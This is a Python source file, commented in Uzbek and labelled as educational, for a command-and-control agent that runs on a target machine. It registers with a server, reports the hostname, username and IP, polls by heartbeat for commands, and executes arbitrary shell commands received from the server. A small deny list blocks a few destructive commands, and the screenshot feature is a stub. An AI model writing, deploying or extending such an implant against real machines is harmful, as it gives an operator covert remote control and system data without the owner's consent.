"""
C2 Agent - Target mashinada ishlaydigan client
"""

import requests
import time
import json
import subprocess
import threading
import os
import sys
from datetime import datetime
import socket

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
try:
    from common.config import *
    from common.utils import *
    from common.crypto import generate_agent_id
except ImportError as e:
    print(f"Import xatosi: {e}")
    # Fallback values
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = 8080
    HEARTBEAT_INTERVAL = 30
    RECONNECT_DELAY = 5
    MAX_RETRIES = 5


class C2Agent:
    """C2 Agent klassi"""
    
    def __init__(self, server_url: str = None):
        self.server_url = server_url or f"http://{SERVER_HOST}:{SERVER_PORT}"
        self.agent_id = self._get_or_create_agent_id()
        self.session = requests.Session()
        self.running = False
        self.system_info = self._get_system_info()
        
    def _get_or_create_agent_id(self) -> str:
        """Agent ID ni olish yoki yaratish"""
        try:
            return generate_agent_id()
        except:
            import uuid
            return str(uuid.uuid4())
    
    def _get_system_info(self) -> dict:
        """Tizim ma'lumotlarini to'plash"""
        try:
            return get_system_info()
        except:
            # Fallback system info
            import platform
            return {
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "username": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
                "ip_address": self._get_local_ip(),
                "timestamp": datetime.now().isoformat()
            }
    
    def _get_local_ip(self) -> str:
        """Lokal IP manzilni olish"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def register(self) -> bool:
        """Serverda ro'yxatdan o'tish"""
        try:
            data = {
                "agent_id": self.agent_id,
                "agent_info": self.system_info
            }
            
            response = self.session.post(
                f"{self.server_url}/api/register",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.log(f"✅ Server bilan muvaffaqiyatli ro'yxatdan o'tdik: {self.agent_id}")
                    return True
            
            self.log(f"❌ Ro'yxatdan o'tishda xato: {response.text}")
            return False
            
        except Exception as e:
            self.log(f"❌ Serverga ulanishda xato: {e}")
            return False
    
    def send_heartbeat(self) -> list:
        """Heartbeat yuborish va komandalarni olish"""
        try:
            data = {
                "agent_id": self.agent_id,
                "timestamp": datetime.now().isoformat()
            }
            
            response = self.session.post(
                f"{self.server_url}/api/heartbeat",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    commands = result.get('commands', [])
                    if commands:
                        self.log(f"📨 {len(commands)} ta komanda olindi")
                    return commands
            
            self.log(f"❌ Heartbeat xatosi: {response.text}")
            return []
            
        except Exception as e:
            self.log(f"❌ Heartbeat yuborishda xato: {e}")
            return []
    
    def execute_command(self, command: dict):
        """Komandani bajarish"""
        try:
            cmd_type = command.get('type', '').lower()
            cmd_id = command.get('id', 'unknown')
            
            self.log(f"🎯 Komanda bajarilmoqda: {cmd_type} (ID: {cmd_id})")
            
            if cmd_type == 'sysinfo':
                result = self._execute_sysinfo()
            elif cmd_type == 'exec':
                result = self._execute_shell_command(command.get('data', ''))
            elif cmd_type == 'screenshot':
                result = self._take_screenshot()
            elif cmd_type == 'heartbeat':
                result = {"status": "alive", "timestamp": datetime.now().isoformat()}
            else:
                result = {"error": f"Noma'lum komanda turi: {cmd_type}"}
            
            self.log(f"✅ Komanda bajarildi: {cmd_type}")
            return result
            
        except Exception as e:
            error_msg = f"Komanda bajarishda xato: {e}"
            self.log(f"❌ {error_msg}")
            return {"error": error_msg}
    
    def _execute_sysinfo(self) -> dict:
        """Tizim ma'lumotlarini olish"""
        return self._get_system_info()
    
    def _execute_shell_command(self, command: str) -> dict:
        """Shell komandani bajarish"""
        try:
            if not command:
                return {"error": "Bo'sh komanda"}
            
            # Xavfli komandalarni tekshirish
            dangerous_commands = ['format', 'del', 'rm -rf', 'shutdown', 'reboot']
            if any(dangerous in command.lower() for dangerous in dangerous_commands):
                return {"error": "Xavfli komanda bloklandi"}
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "timestamp": datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {"error": "Komanda timeout bo'ldi (30s)"}
        except Exception as e:
            return {"error": f"Shell komanda xatosi: {e}"}
    
    def _take_screenshot(self) -> dict:
        """Screenshot olish (sodda implementatsiya)"""
        try:
            # Bu yerda PIL yoki boshqa kutubxona kerak bo'ladi
            return {
                "error": "Screenshot funksiyasi hali ishlab chiqilmagan",
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": f"Screenshot xatosi: {e}"}
    
    def start(self):
        """Agent ishlashni boshlash"""
        self.running = True
        self.log("🚀 C2 Agent ishga tushmoqda...")
        
        # Serverga ro'yxatdan o'tish
        retry_count = 0
        while retry_count < MAX_RETRIES and not self.register():
            retry_count += 1
            self.log(f"🔄 Qayta urinish {retry_count}/{MAX_RETRIES}")
            time.sleep(RECONNECT_DELAY)
        
        if retry_count >= MAX_RETRIES:
            self.log("❌ Serverga ulanib bo'lmadi. Chiqish...")
            return
        
        # Asosiy tsikl
        while self.running:
            try:
                # Heartbeat yuborish va komandalarni olish
                commands = self.send_heartbeat()
                
                # Komandalarni bajarish
                for command in commands:
                    result = self.execute_command(command)
                    # Bu yerda natijani serverga yuborish kerak bo'ladi
                
                time.sleep(HEARTBEAT_INTERVAL)
                
            except KeyboardInterrupt:
                self.log("🛑 Agent to'xtatilmoqda...")
                self.running = False
                break
            except Exception as e:
                self.log(f"❌ Asosiy tsiklda xato: {e}")
                time.sleep(RECONNECT_DELAY)
    
    def stop(self):
        """Agent ishlashni to'xtatish"""
        self.running = False
        self.log("🛑 Agent to'xtatildi")
    
    def log(self, message: str):
        """Log xabarini chiqarish"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [AGENT:{self.agent_id[:8]}] {message}")


def main():
    """Asosiy funksiya"""
    print("=" * 50)
    print("🎯 C2 Agent - Ta'lim maqsadida")
    print("⚠️  Faqat o'z kompyuteringizda sinash uchun!")
    print("=" * 50)
    
    # Agent yaratish va ishga tushirish
    agent = C2Agent()
    
    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()
    except Exception as e:
        print(f"❌ Xato: {e}")


if __name__ == "__main__":
    main()